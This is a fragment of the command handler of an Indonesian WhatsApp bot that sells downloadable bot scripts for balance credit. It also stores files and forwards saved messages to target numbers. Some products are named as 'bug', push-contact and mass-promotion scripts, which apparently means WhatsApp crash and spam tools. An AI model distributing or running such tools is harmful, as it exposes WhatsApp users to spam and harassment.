reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/g01n99speif85bj/Free5.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc6': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m4tgdftzm9t2nji/Free6.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc7': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/x6th6u4nh8ad8wv/Scv7.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc8': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/k13jxfbeimrrtjn/Sc+Gratis+By+Rafathar.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc9': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/b4qcuinhpkmg5n8/Sc+Gratis.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc10': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/0xy68my2nju4rx0/Pw+Cari+Sendiri,+Gush+Chat+Gw.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc11': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lv7zxaijoonpexd/Sc+Hw21_No+Enc.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv1': {
 if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/xfw5xe4mprrlrq9/Sc_Bug_V1.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv2': {
if (cekSaldo(sender,db_saldo) < 25000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xuzamc8oayprn4k/Sc_Bug_V2.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscbugv3': {
if (cekSaldo(sender,db_saldo) < 35000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/l76f8btgfpqln9z/Sc_Bug_V3.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjagagrupv2': {
if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)    
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscpushkontak': {
if (cekSaldo(sender,db_saldo) < 10000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscpushautosave': {
if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv1': {
if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/bdtbszlg69old31/Jpm+X+PushKntk+V1.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv2': {
if (cekSaldo(sender,db_saldo) < 20000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 20000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/ilam1m6wsgxqh6b/Jpm+X+PushKntk+V2.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buyscjpmv3': {
if (cekSaldo(sender,db_saldo) < 25000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 25000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/o1sj4k0aeb2frm0/Jpm+X+PushKntk+V3.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buymodule': {
if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 15000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`)
const baby2 = await mediafireDl('-')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
case 'apksearch': {
if (!text) return reply(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await slime.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    slime.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break
   case 'setbiobot':{
if (!isCreator) return reply(`Khusus SlimexTzy`)
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await kyu.updateProfileStatus(text)
    reply(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!isAdmins) return reply(`Khusus admin`)
if (!isBotAdmins) return reply(`Jadikan Hanako Admin Dulu`)
    await slime.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!isCreator) return reply(`Khusus SlimexTzy`)
    await slime.removeProfilePicture(slime.user.id)
    reply(`Success in deleting bot's profile picture`)
    }
    break
    case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = `list cmd`
slime.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await slime.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
slime.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
slime.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await slime.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
slime.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
slime.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await slime.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
slime.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
slime.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await slime.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 slime.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 slime.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await slime.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x',
title: `SlimexTzy`,
sourceUrl: `https://linktr.ee/slimextzy`, 
thumbnail: thumb
}
}})
break
case 'minsaldo':
if (!isCreator) m.reply(mess.OnlyOwner)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah dek🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
case 'addsaldo':{
if (!isCreator) return m.reply('F')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
}
break
case 'dana':{
reply('Dana : 085715430424\nKirim Ss Bukti Dengan Cara .bukti dana 10.000')
}
break
case 'ovo':{
reply ('Ovo : 085718275389\nKirim Ss Bukti Dengan Cara .bukti ovo 10.000')
}
break
case 'gopay':{
